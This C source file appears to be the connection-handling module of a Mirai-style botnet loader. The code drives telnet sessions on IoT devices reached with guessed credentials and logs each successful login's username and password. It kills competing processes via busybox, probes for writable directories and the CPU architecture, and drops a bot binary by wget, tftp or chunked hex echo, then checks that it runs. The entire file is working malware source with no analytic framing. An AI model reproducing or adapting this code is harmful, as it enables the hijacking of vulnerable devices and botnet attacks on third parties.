#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include "headers/includes.h"
#include "headers/connection.h"
#include "headers/server.h"
#include "headers/binary.h"
#include "headers/util.h"

void connection_open(struct connection *conn)
{
    pthread_mutex_lock(&conn->lock);

    conn->rdbuf_pos = 0;
    conn->last_recv = time(NULL);
    conn->timeout = 10;
    conn->echo_load_pos = 0;
    conn->state_telnet = TELNET_CONNECTING;
    conn->success = FALSE;
    conn->open = TRUE;
    conn->bin = NULL;
    conn->echo_load_pos = 0;
#ifdef DEBUG
    printf("[FD%d] Called connection_open\n", conn->fd);
#endif

    pthread_mutex_unlock(&conn->lock);
}

void connection_close(struct connection *conn)
{
    pthread_mutex_lock(&conn->lock);

    if (conn->open)
    {
#ifdef DEBUG
        printf("[FD%d] Shut down connection\n", conn->fd);
#endif
        memset(conn->output_buffer.data, 0, sizeof(conn->output_buffer.data));
        conn->output_buffer.deadline = 0;
        conn->last_recv = 0;
        conn->open = FALSE;
        conn->retry_bin = FALSE;
        conn->ctrlc_retry = FALSE;
        memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
        conn->rdbuf_pos = 0;

        if (conn->srv == NULL)
        {
            printf("srv == NULL\n");
            return;
        }

        if (conn->success)
        {
            ATOMIC_INC(&conn->srv->total_successes);
            fprintf(stderr, "OK|%d.%d.%d.%d:%d %s:%s %s\n",
                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
                ntohs(conn->info.port),
                conn->info.user, conn->info.pass, conn->info.arch);
        }
        else
        {
            ATOMIC_INC(&conn->srv->total_failures);
            fprintf(stderr, "ERR|%d.%d.%d.%d:%d %s:%s %s|%d\n",
                conn->info.addr & 0xff, (conn->info.addr >> 8) & 0xff, (conn->info.addr >> 16) & 0xff, (conn->info.addr >> 24) & 0xff,
                ntohs(conn->info.port),
                conn->info.user, conn->info.pass, conn->info.arch,
                conn->state_telnet);
        }
    }
    conn->state_telnet = TELNET_CLOSED;

    if (conn->fd != -1)
    {
        close(conn->fd);
        conn->fd = -1;
        ATOMIC_DEC(&conn->srv->curr_open);
    }

    pthread_mutex_unlock(&conn->lock);
}

int connection_consume_iacs(struct connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

int connection_consume_login_prompt(struct connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos; i >= 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
#ifdef DEBUG
            printf("matched login prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
#endif
            prompt_ending = i;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

int connection_consume_password_prompt(struct connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos; i >= 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
#ifdef DEBUG
            printf("matched password prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
#endif
            prompt_ending = i;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

int connection_consume_prompt(struct connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos; i >= 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
#ifdef DEBUG
            printf("matched any prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
#endif
            prompt_ending = i;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

int connection_consume_verify_login(struct connection *conn)
{
    int prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

int connection_consume_psoutput(struct connection *conn)
{
    int offset;
    char *start = conn->rdbuf;
    int i, ii;

    offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    for (i = 0; i < (offset == -1 ? conn->rdbuf_pos : offset); i++)
    {
        if (conn->rdbuf[i] == '\r')
            conn->rdbuf[i] = 0;
        else if (conn->rdbuf[i] == '\n')
        {
            uint8_t option_on = 0;
            BOOL last_character_was_space = FALSE;
            char *pid_str = NULL, *proc_name = NULL;

            conn->rdbuf[i] = 0;
            for (ii = 0; ii < ((char *)&conn->rdbuf[i] - start); ii++)
            {
                if (start[ii] == ' ' || start[ii] == '\t' || start[ii] == 0)
                {
                    if (option_on > 0 && !last_character_was_space)
                        option_on++;
                    start[ii] = 0;
                    last_character_was_space = TRUE;
                }
                else
                {
                    if (option_on == 0)
                    {
                        pid_str = &start[ii];
                        option_on++;
                    }
                    else if (option_on >= 3 && option_on <= 5 && last_character_was_space)
                    {
                        proc_name = &start[ii];
                    }
                    last_character_was_space = FALSE;
                }
            }

            if (pid_str != NULL && proc_name != NULL)
            {
                int pid = atoi(pid_str);
                int len_proc_name = strlen(proc_name);

#ifdef DEBUG
                printf("pid: %d, proc_name: %s\n", pid, proc_name);
#endif

                if (pid != 1 && (strcmp(proc_name, "init") == 0 || strcmp(proc_name, "[init]") == 0)) // Kill the second init
                    util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
                else if (pid > 400)
                {
                    int num_count = 0;
                    int num_alphas = 0;

                    for (ii = 0; ii < len_proc_name; ii++)
                    {
                        if (proc_name[ii] >= '0' && proc_name[ii] <= '9')
                            num_count++;
                        else if ((proc_name[ii] >= 'a' && proc_name[ii] <= 'z') || (proc_name[ii] >= 'A' && proc_name[ii] <= 'Z'))
                        {
                            num_alphas++;
                            break;
                        }
                    }

                    if (num_alphas == 0 && num_count > 0)
                    {
                        //util_sockprintf(conn->fd, "/bin/busybox cat /proc/%d/environ", pid); // lol
#ifdef DEBUG
                        printf("Killing suspicious process (pid=%d, name=%s)\n", pid, proc_name);
#endif
                        util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
                    }
                }
            }

            start = conn->rdbuf + i + 1;
        }
    }

    if (offset == -1)
    {
        if (conn->rdbuf_pos > 7168)
        {
            memmove(conn->rdbuf, conn->rdbuf + 6144, conn->rdbuf_pos - 6144);
            conn->rdbuf_pos -= 6144;
        }
        return 0;
    }
    else
    {
        for (i = 0; i < conn->rdbuf_pos; i++)
        {
            if (conn->rdbuf[i] == 0)
                conn->rdbuf[i] = ' ';
        }
        return offset;
    }
}

int connection_consume_mounts(struct connection *conn)
{
    char linebuf[256];
    int linebuf_pos = 0, num_whitespaces = 0;
    int i, prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (prompt_ending == -1)
        return 0;

    for (i = 0; i < prompt_ending; i++)
    {

        if (linebuf_pos == sizeof(linebuf) - 1)
        {
            // why are we here
            break;
        }

        if (conn->rdbuf[i] == '\n')
        {
            char *path, *mnt_info;

            linebuf[linebuf_pos++] = 0;

            strtok(linebuf, " "); // Skip name of partition
            if ((path = strtok(NULL, " ")) == NULL)
                goto dirs_end_line;
            if (strtok(NULL, " ") == NULL) // Skip type of partition
                goto dirs_end_line;
            if ((mnt_info = strtok(NULL, " ")) == NULL)
                goto dirs_end_line;

            if (path[strlen(path) - 1] == '/')
                path[strlen(path) - 1] = 0;

            if (util_memsearch(mnt_info, strlen(mnt_info), "rw", 2) != -1)
            {
                util_sockprintf(conn->fd, "/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\r\n",
                                VERIFY_STRING_HEX, path, path, path, path, path);
            }

            dirs_end_line:
            linebuf_pos = 0;
        }
        else if (conn->rdbuf[i] == ' ' || conn->rdbuf[i] == '\t')
        {
            if (num_whitespaces++ == 0)
                linebuf[linebuf_pos++] = conn->rdbuf[i];
        }
        else if (conn->rdbuf[i] != '\r')
        {
            num_whitespaces = 0;
            linebuf[linebuf_pos++] = conn->rdbuf[i];
        }
    }

    util_sockprintf(conn->fd, "/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\r\n",
                                VERIFY_STRING_HEX);

    util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
    return prompt_ending;
}

int connection_consume_written_dirs(struct connection *conn)
{
    int end_pos, i, offset, total_offset = 0;
    BOOL found_writeable = FALSE;

    if ((end_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) == -1)
        return 0;

    while (TRUE)
    {
        char *pch;
        int pch_len;

        offset = util_memsearch(conn->rdbuf + total_offset, end_pos - total_offset, VERIFY_STRING_CHECK, strlen(VERIFY_STRING_CHECK));
        if (offset == -1)
            break;
        total_offset += offset;

        pch = strtok(conn->rdbuf + total_offset, "\n");
        if (pch == NULL)
            continue;
        pch_len = strlen(pch);

        if (pch[pch_len - 1] == '\r')
            pch[pch_len - 1] = 0;

        util_sockprintf(conn->fd, "rm %s/.t; rm %s/.sh; rm %s/.human\r\n", pch, pch, pch);
        if (!found_writeable)
        {
            if (pch_len < 31)
            {
                strcpy(conn->info.writedir, pch);
                found_writeable = TRUE;
            }
            else
                connection_close(conn);
        }
    }

    return end_pos;
}

int connection_consume_copy_op(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;
    return offset;
}

int connection_consume_arch(struct connection *conn)
{
    if (!conn->info.has_arch)
    {
        struct elf_hdr *ehdr;
        int elf_start_pos;

        if ((elf_start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ELF", 3)) == -1)
            return 0;
        elf_start_pos -= 4; // Go back ELF

        ehdr = (struct elf_hdr *)(conn->rdbuf + elf_start_pos);
        conn->info.has_arch = TRUE;

        switch (ehdr->e_ident[EI_DATA])
        {
            case EE_NONE:
                return 0;
            case EE_BIG:
#ifdef LOADER_LITTLE_ENDIAN
                ehdr->e_machine = htons(ehdr->e_machine);
#endif
                break;
            case EE_LITTLE:
#ifdef LOADER_BIG_ENDIAN
                ehdr->e_machine = htons(ehdr->e_machine);
#endif
                break;
        }

        /* arm mpsl spc m68k ppc x86 mips sh4 */
        if (ehdr->e_machine == EM_ARM || ehdr->e_machine == EM_AARCH64)
            strcpy(conn->info.arch, "arm");
        else if (ehdr->e_machine == EM_MIPS || ehdr->e_machine == EM_MIPS_RS3_LE)
        {
            if (ehdr->e_ident[EI_DATA] == EE_LITTLE)
                strcpy(conn->info.arch, "mpsl");
            else
                strcpy(conn->info.arch, "mips");
        }
        else if (ehdr->e_machine == EM_386 || ehdr->e_machine == EM_486 || ehdr->e_machine == EM_860 || ehdr->e_machine == EM_X86_64)
            strcpy(conn->info.arch, "x86");
        else if (ehdr->e_machine == EM_SPARC || ehdr->e_machine == EM_SPARC32PLUS || ehdr->e_machine == EM_SPARCV9)
            strcpy(conn->info.arch, "spc");
        else if (ehdr->e_machine == EM_68K || ehdr->e_machine == EM_88K)
            strcpy(conn->info.arch, "m68k");
        else if (ehdr->e_machine == EM_PPC || ehdr->e_machine == EM_PPC64)
            strcpy(conn->info.arch, "ppc");
        else if (ehdr->e_machine == EM_SH)
            strcpy(conn->info.arch, "sh4");
        else
        {
            conn->info.arch[0] = 0;
            connection_close(conn);
        }
    }
    else
    {
        int offset;

        if ((offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) != -1)
            return offset;
        if (conn->rdbuf_pos > 7168)
        {
            // Hack drain buffer
            memmove(conn->rdbuf, conn->rdbuf + 6144, conn->rdbuf_pos - 6144);
            conn->rdbuf_pos -= 6144;
        }
    }

    return 0;
}

int connection_consume_arm_subtype(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    if (util_memsearch(conn->rdbuf, offset, "ARMv7", 5) != -1 || util_memsearch(conn->rdbuf, offset, "ARMv6", 5) != -1)
    {
#ifdef DEBUG
        printf("[FD%d] Arch has ARMv7!\n", conn->fd);
#endif
        strcpy(conn->info.arch, "arm7");
    }

    return offset;
}

int connection_consume_upload_methods(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    if (util_memsearch(conn->rdbuf, offset, "wget: applet not found", 22) == -1)
        conn->info.upload_method = UPLOAD_WGET;
    else if (util_memsearch(conn->rdbuf, offset, "tftp: applet not found", 22) == -1)
        conn->info.upload_method = UPLOAD_TFTP;
    else
        conn->info.upload_method = UPLOAD_ECHO;

    return offset;
}

int connection_upload_echo(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    if (conn->bin == NULL)
    {
        connection_close(conn);
        return 0;
    }
    
    if (conn->echo_load_pos == conn->bin->hex_payloads_len)
        return offset;

    // echo -ne 'hex' [>]> path/FN_DROPPER
    util_sockprintf(conn->fd, "echo -ne '%s' %s " FN_DROPPER "; " TOKEN_QUERY "\r\n",
                    conn->bin->hex_payloads[conn->echo_load_pos], (conn->echo_load_pos == 0) ? ">" : ">>");
    conn->echo_load_pos++;

    // Hack drain
    memmove(conn->rdbuf, conn->rdbuf + offset, conn->rdbuf_pos - offset);
    conn->rdbuf_pos -= offset;

    return 0;
}

int connection_upload_wget(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    return offset;
}

int connection_upload_tftp(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    if (util_memsearch(conn->rdbuf, offset, "Permission denied", 17) != -1)
        return offset * -1;

    if (util_memsearch(conn->rdbuf, offset, "timeout", 7) != -1)
        return offset * -1;

    if (util_memsearch(conn->rdbuf, offset, "illegal option", 14) != -1)
        return offset * -1;

    return offset;
}

int connection_verify_payload(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, EXEC_RESPONSE, strlen(EXEC_RESPONSE));

    if (offset == -1)
        return 0;

    if (util_memsearch(conn->rdbuf, offset, "listening tun0", 14) == -1)
        return offset;
    else
        return 255 + offset;
}

int connection_consume_cleanup(struct connection *conn)
{
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;
    return offset;
}

static BOOL can_consume(struct connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}
